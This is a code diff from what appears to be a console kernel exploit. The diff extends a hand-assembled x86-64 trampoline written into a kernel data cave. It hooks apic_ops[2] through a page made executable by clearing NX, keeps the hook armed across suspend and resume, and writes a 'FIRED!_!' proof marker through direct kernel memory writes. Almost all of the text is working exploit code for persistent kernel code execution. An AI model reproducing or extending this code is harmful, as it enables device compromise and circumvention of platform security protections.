@@ -4068,24 +4068,46 @@ ring3_fallback:
                  *   - Guest PTE NX-clear makes kdata executable (ring-0 test passed)
                  *   - kdata cave at kdata_base is writable via DMAP
                  *
-                 * The trampoline is 28 bytes: 20 bytes of code + 8 bytes for
-                 * g_trampoline_target.  Placed at kdata_base + 0x100 (after
-                 * the 32-byte Phase 7 persistence marker at kdata_base + 0x00).
+                 * The trampoline is 56 bytes: 40 bytes of code + 8 bytes for
+                 * g_trampoline_target + 8 bytes for proof_marker_addr.
+                 * Placed at kdata_base + 0x100 (after the Phase 7
+                 * persistence marker at kdata_base + 0x00..0x3F).
+                 *
+                 * The trampoline writes a "FIRED" proof marker (0x4649524544215F21)
+                 * to kdata_base + 0x20 via a DMAP-mapped address stored at
+                 * proof_marker_addr.  This lets us detect whether the trampoline
+                 * was actually called during resume.
                  *
                  * Machine code:
-                 *   mov rax, [rip+0x0d]   ; load g_trampoline_target
-                 *   test rax, rax          ; NULL check
-                 *   jz .fallback           ; if NULL, return 1
-                 *   jmp rax               ; tail-call original xapic_mode
+                 *   push rcx                    ; save clobbered regs
+                 *   push rdx
+                 *   mov rcx, [rip+proof_off]    ; load proof DMAP address
+                 *   test rcx, rcx               ; NULL check
+                 *   jz .skip_proof
+                 *   movabs rdx, 0x4649524544215F21  ; "FIRED!_!" magic
+                 *   mov [rcx], rdx              ; write proof to kdata cave
+                 * .skip_proof:
+                 *   pop rdx                     ; restore regs
+                 *   pop rcx
+                 *   mov rax, [rip+target_off]   ; load g_trampoline_target
+                 *   test rax, rax               ; NULL check
+                 *   jz .fallback                ; if NULL, return 1
+                 *   jmp rax                     ; tail-call original xapic_mode
                  * .fallback:
-                 *   mov eax, 1            ; APIC_MODE_XAPIC (required for LAPIC)
+                 *   mov eax, 1                  ; APIC_MODE_XAPIC
                  *   ret
                  * g_trampoline_target:
                  *   .quad 0               ; patched by Phase 7 with original xapic
+                 * g_proof_marker_addr:
+                 *   .quad 0               ; patched with DMAP addr of kdata+0x20
                  */
-                #define CAVE_TRAMP_OFFSET  0x100  /* offset within kdata_base page */
-                #define CAVE_TRAMP_CODE_SZ 20     /* bytes of executable code */
-                #define CAVE_TRAMP_TOTAL   28     /* code + 8-byte target variable */
+                #define CAVE_TRAMP_OFFSET     0x100  /* offset within kdata_base page */
+                #define CAVE_TRAMP_TARGET_OFF 40     /* offset to g_trampoline_target */
+                #define CAVE_TRAMP_PROOF_OFF  48     /* offset to g_proof_marker_addr */
+                #define CAVE_TRAMP_CODE_SZ    40     /* bytes of executable code */
+                #define CAVE_TRAMP_TOTAL      56     /* code + 8-byte target + 8-byte proof addr */
+                #define CAVE_PROOF_MARKER     0x4649524544215F21ULL  /* "FIRED!_!" */
+                #define CAVE_PROOF_OFFSET     0x20   /* kdata_base+0x20 = proof location */
 
                 if (!g_kmod_trampoline_func) {
                     printf("=============================================\n");
@@ -4094,22 +4116,77 @@ ring3_fallback:
                     printf("[*] Kmod trampoline unavailable — building in kdata cave.\n");
                     fflush(stdout);
 
-                    static const uint8_t cave_tramp_code[CAVE_TRAMP_TOTAL] = {
-                        /* mov rax, [rip+0x0d] — load target from offset 20 */
-                        0x48, 0x8b, 0x05, 0x0d, 0x00, 0x00, 0x00,
-                        /* test rax, rax */
-                        0x48, 0x85, 0xc0,
-                        /* jz +2 (skip jmp rax, go to mov eax,1) */
-                        0x74, 0x02,
-                        /* jmp rax — tail-call original */
-                        0xff, 0xe0,
-                        /* mov eax, 1 — fallback: return APIC_MODE_XAPIC */
-                        0xb8, 0x01, 0x00, 0x00, 0x00,
-                        /* ret */
-                        0xc3,
-                        /* g_trampoline_target (8 bytes, initialized to 0) */
-                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
-                    };
+                    /*
+                     * Build trampoline with proof marker + original call-through.
+                     * All RIP-relative offsets computed from instruction position.
+                     */
+                    uint8_t cave_tramp_code[CAVE_TRAMP_TOTAL];
+                    int p = 0;
+
+                    /* push rcx */
+                    cave_tramp_code[p++] = 0x51;
+                    /* push rdx */
+                    cave_tramp_code[p++] = 0x52;
+                    /* mov rcx, [rip+disp32] — load proof_marker_addr
+                     * RIP after this instruction = p+7, target at CAVE_TRAMP_PROOF_OFF
+                     * disp = CAVE_TRAMP_PROOF_OFF - (p+7) */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x8b;
+                    cave_tramp_code[p++] = 0x0d;
+                    {
+                        int32_t disp = CAVE_TRAMP_PROOF_OFF - (p + 4);
+                        memcpy(&cave_tramp_code[p], &disp, 4); p += 4;
+                    }
+                    /* test rcx, rcx */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x85;
+                    cave_tramp_code[p++] = 0xc9;
+                    /* jz .skip_proof (+12 bytes: movabs=10 + mov [rcx],rdx=3 - 1) */
+                    cave_tramp_code[p++] = 0x74;
+                    cave_tramp_code[p++] = 0x0d; /* skip 13 bytes */
+                    /* movabs rdx, CAVE_PROOF_MARKER (10 bytes) */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0xba;
+                    {
+                        uint64_t magic = CAVE_PROOF_MARKER;
+                        memcpy(&cave_tramp_code[p], &magic, 8); p += 8;
+                    }
+                    /* mov [rcx], rdx (3 bytes) */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x89;
+                    cave_tramp_code[p++] = 0x11;
+                    /* .skip_proof: pop rdx */
+                    cave_tramp_code[p++] = 0x5a;
+                    /* pop rcx */
+                    cave_tramp_code[p++] = 0x59;
+                    /* mov rax, [rip+disp32] — load g_trampoline_target
+                     * RIP after = p+7, target at CAVE_TRAMP_TARGET_OFF */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x8b;
+                    cave_tramp_code[p++] = 0x05;
+                    {
+                        int32_t disp = CAVE_TRAMP_TARGET_OFF - (p + 4);
+                        memcpy(&cave_tramp_code[p], &disp, 4); p += 4;
+                    }
+                    /* test rax, rax */
+                    cave_tramp_code[p++] = 0x48; cave_tramp_code[p++] = 0x85;
+                    cave_tramp_code[p++] = 0xc0;
+                    /* jz +2 */
+                    cave_tramp_code[p++] = 0x74; cave_tramp_code[p++] = 0x02;
+                    /* jmp rax */
+                    cave_tramp_code[p++] = 0xff; cave_tramp_code[p++] = 0xe0;
+                    /* mov eax, 1 */
+                    cave_tramp_code[p++] = 0xb8; cave_tramp_code[p++] = 0x01;
+                    cave_tramp_code[p++] = 0x00; cave_tramp_code[p++] = 0x00;
+                    cave_tramp_code[p++] = 0x00;
+                    /* ret */
+                    cave_tramp_code[p++] = 0xc3;
+                    /* Pad to CAVE_TRAMP_CODE_SZ if needed */
+                    while (p < CAVE_TRAMP_CODE_SZ)
+                        cave_tramp_code[p++] = 0xcc; /* int3 padding */
+                    /* g_trampoline_target (8 bytes, initialized to 0) */
+                    memset(&cave_tramp_code[p], 0, 8); p += 8;
+                    /* g_proof_marker_addr (8 bytes, initialized to 0) */
+                    memset(&cave_tramp_code[p], 0, 8); p += 8;
+
+                    printf("[*] Cave trampoline: %d bytes (%d code + %d data)\n",
+                           p, CAVE_TRAMP_CODE_SZ,
+                           p - CAVE_TRAMP_CODE_SZ);
 
                     uint64_t tramp_cave_kva = target_kva + CAVE_TRAMP_OFFSET;
                     uint64_t tramp_cave_pa  = target_pa + CAVE_TRAMP_OFFSET;
@@ -4147,7 +4224,22 @@ ring3_fallback:
                         if (pte_readback == new_pte) {
                             g_kmod_trampoline_func = tramp_cave_kva;
                             g_kmod_trampoline_target = tramp_cave_kva +
-                                                       CAVE_TRAMP_CODE_SZ;
+                                                       CAVE_TRAMP_TARGET_OFF;
+
+                            /* Patch proof marker DMAP address into trampoline.
+                             * The trampoline writes CAVE_PROOF_MARKER to this
+                             * address when it fires, proving code execution
+                             * during resume. */
+                            uint64_t proof_dmap_addr = g_dmap_base + target_pa +
+                                                       CAVE_PROOF_OFFSET;
+                            kernel_copyin(&proof_dmap_addr,
+                                          g_dmap_base + tramp_cave_pa +
+                                          CAVE_TRAMP_PROOF_OFF, 8);
+
+                            /* Clear the proof location so we can detect fresh writes */
+                            uint64_t zero = 0;
+                            kernel_copyin(&zero,
+                                          g_dmap_base + target_pa + CAVE_PROOF_OFFSET, 8);
 
                             printf("\n[+] ============================================\n");
                             printf("[+]  CAVE TRAMPOLINE INSTALLED\n");
@@ -4156,6 +4248,10 @@ ring3_fallback:
                                    (unsigned long)g_kmod_trampoline_func);
                             printf("[+] g_trampoline_target     = 0x%016lx\n",
                                    (unsigned long)g_kmod_trampoline_target);
+                            printf("[+] g_proof_marker_addr     = 0x%016lx\n",
+                                   (unsigned long)proof_dmap_addr);
+                            printf("[+] Proof location:  kdata+0x%x (writes 0x%016lx)\n",
+                                   CAVE_PROOF_OFFSET, (unsigned long)CAVE_PROOF_MARKER);
                             printf("[+] Guest PTE NX permanently cleared for this page.\n");
                             printf("[+] Phase 7 can now arm apic_ops[2] hook.\n");
                         } else {
@@ -4972,7 +5068,7 @@ static void campaign_flatz_setup(void) {
          */
         #define PHASE7_MARKER 0x42EFCDABUL
         #define P7_CAVE_MAGIC    0x464C41545A484F4FULL  /* "FLATZHOO" */
-        #define P7_MARKER_SIZE   32
+        #define P7_MARKER_SIZE   64   /* extended: 0x00-0x1F markers, 0x20-0x27 proof */
 
         int p7_is_post_resume = 0;
         uint64_t p7_hook_addr = ops[2];
@@ -5092,6 +5188,55 @@ static void campaign_flatz_setup(void) {
                     printf("[+]   apic_ops[2]:     RETAINED (value unchanged)\n");
                 else
                     printf("[+]   apic_ops[2]:     CHANGED by kernel reinit\n");
+            }
+
+            /* ── Cave trampoline proof marker check ── */
+            {
+                uint64_t proof_pa = va_to_pa_quiet(g_kdata_base);
+                uint64_t proof_val = 0;
+                int tramp_fired = 0;
+                if (proof_pa) {
+                    kernel_copyout(g_dmap_base + proof_pa + CAVE_PROOF_OFFSET,
+                                   &proof_val, 8);
+                    tramp_fired = (proof_val == CAVE_PROOF_MARKER);
+                }
+                uint64_t cave_tramp_kva = g_kdata_base + CAVE_TRAMP_OFFSET;
+                int hook_points_to_cave = (xapic_now == cave_tramp_kva);
+
+                printf("\n[*] Cave trampoline resume check:\n");
+                printf("    Proof marker at kdata+0x%x: 0x%016lx\n",
+                       CAVE_PROOF_OFFSET, (unsigned long)proof_val);
+                printf("    Expected (FIRED!_!):        0x%016lx\n",
+                       (unsigned long)CAVE_PROOF_MARKER);
+                printf("    Cave tramp KVA:             0x%016lx\n",
+                       (unsigned long)cave_tramp_kva);
+                printf("    apic_ops[2] now:            0x%016lx\n",
+                       (unsigned long)xapic_now);
+
+                if (tramp_fired && hook_points_to_cave) {
+                    printf("    >>> TRAMPOLINE FIRED DURING RESUME! <<<\n");
+                    printf("    >>> Hook survived + proof marker written! <<<\n");
+                    printf("[+]   Cave tramp:      FIRED!\n");
+                } else if (tramp_fired && !hook_points_to_cave) {
+                    printf("    >>> TRAMPOLINE FIRED but hook was restored! <<<\n");
+                    printf("    (kernel may have reinitialized apic_ops)\n");
+                    printf("[+]   Cave tramp:      FIRED (hook lost)\n");
+                } else if (!tramp_fired && hook_points_to_cave) {
+                    printf("    Hook still points to cave but no proof marker.\n");
+                    printf("    Trampoline may not have been called yet.\n");
+                    printf("[+]   Cave tramp:      ARMED (not fired)\n");
+                } else {
+                    printf("    No proof marker, hook not pointing to cave.\n");
+                    printf("    Cave trampoline was not armed during suspend.\n");
+                    printf("[+]   Cave tramp:      NOT ARMED\n");
+                }
+
+                /* Clear proof marker for next cycle */
+                if (tramp_fired && proof_pa) {
+                    uint64_t zero = 0;
+                    kernel_copyin(&zero, g_dmap_base + proof_pa + CAVE_PROOF_OFFSET, 8);
+                    printf("[*] Proof marker cleared for next cycle.\n");
+                }
             }
 
             /* Clear QA marker */
@@ -5344,27 +5489,41 @@ static void campaign_flatz_setup(void) {
             }
 
             if (hook_armed) {
-                /* Restore apic_ops[2] to the ORIGINAL xapic_mode before
-                 * entering rest mode.  During suspend, cpususpend_handler
-                 * on secondary CPUs calls xapic_mode() via apic_ops[2].
-                 * The KLD trampoline pages may not be executable at the
-                 * NPT level on all CPUs (only the CPU that ran kldload
-                 * is guaranteed to have the NPT entry), causing kernel
-                 * panic on secondary CPUs.
+                /*
+                 * Cave trampoline vs KLD trampoline:
                  *
-                 * The hook target is saved in the cave marker (offset
-                 * 0x18) and QA flags so it can be re-armed after resume.
-                 * This lets us safely test persistence of the MARKERS
-                 * without risking a panic from the hook itself. */
-                printf("[+]\n");
-                printf("[*] Restoring apic_ops[2] to original before rest mode...\n");
-                kernel_copyin(&original_xapic,
-                              g_dmap_base + ops_pa + 0x10, 8);
-                uint64_t restore_verify = 0;
-                kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
-                printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
-                       (unsigned long)restore_verify,
-                       restore_verify == original_xapic ? "OK" : "FAIL");
+                 * The cave trampoline lives in kdata (at kdata_base+0x100).
+                 * It's safe to leave armed during suspend because:
+                 *   - All CPUs share the same guest page tables
+                 *   - The guest PTE NX-clear is permanent (persists across resume)
+                 *   - NPT allows execution on kdata pages (confirmed by ring-0 test)
+                 *   - The trampoline calls through to the original xapic_mode
+                 *
+                 * The KLD trampoline lives in kldload-allocated module pages
+                 * which may not be NPT-executable on secondary CPUs. So we
+                 * only leave the hook armed for cave trampolines.
+                 */
+                if (hook_is_cave) {
+                    printf("[+]\n");
+                    printf("[*] Cave trampoline hook — LEAVING ARMED during suspend.\n");
+                    printf("    Cave trampoline is in kdata (shared by all CPUs).\n");
+                    printf("    Guest PTE NX-clear persists across resume.\n");
+                    printf("    NPT allows execution on kdata PA.\n");
+                    printf("    On resume: cpususpend_handler → apic_ops[2]\n");
+                    printf("      → cave trampoline → original xapic_mode → returns 1\n");
+                } else {
+                    /* KLD trampoline: restore original to prevent panic on secondary CPUs */
+                    printf("[+]\n");
+                    printf("[*] KLD trampoline — restoring apic_ops[2] before rest mode.\n");
+                    printf("    KLD pages may not be NPT-executable on secondary CPUs.\n");
+                    kernel_copyin(&original_xapic,
+                                  g_dmap_base + ops_pa + 0x10, 8);
+                    uint64_t restore_verify = 0;
+                    kernel_copyout(g_dmap_base + ops_pa + 0x10, &restore_verify, 8);
+                    printf("    apic_ops[2] restored: 0x%016lx [%s]\n",
+                           (unsigned long)restore_verify,
+                           restore_verify == original_xapic ? "OK" : "FAIL");
+                }
 
                 /* Enter rest mode programmatically */
                 printf("[*] Calling sceSystemStateMgrEnterStandby()...\n");
